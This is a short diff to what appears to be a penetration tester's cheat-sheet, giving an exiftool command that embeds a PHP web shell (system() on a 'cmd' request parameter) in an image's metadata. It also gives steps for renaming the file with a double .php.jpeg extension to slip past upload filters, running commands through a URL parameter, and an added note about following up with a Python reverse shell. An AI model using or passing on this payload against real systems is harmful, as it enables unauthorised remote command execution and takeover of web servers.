@@ -1,5 +1,6 @@
 #On kali$ apt-get install exiftool
 #Change image filename to include .php before image extension: image.php.jpeg (works with png etc etc)
 #Upload, execute image location adding ?cmd=command-here example: www.site.com/image.php.jpeg?cmd=ls
+#To acheive terminal shell, execute rev shell python from pentest monkey etc etc.
 
 exiftool -DocumentName="<h1>F1uffyGoat<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.jpeg
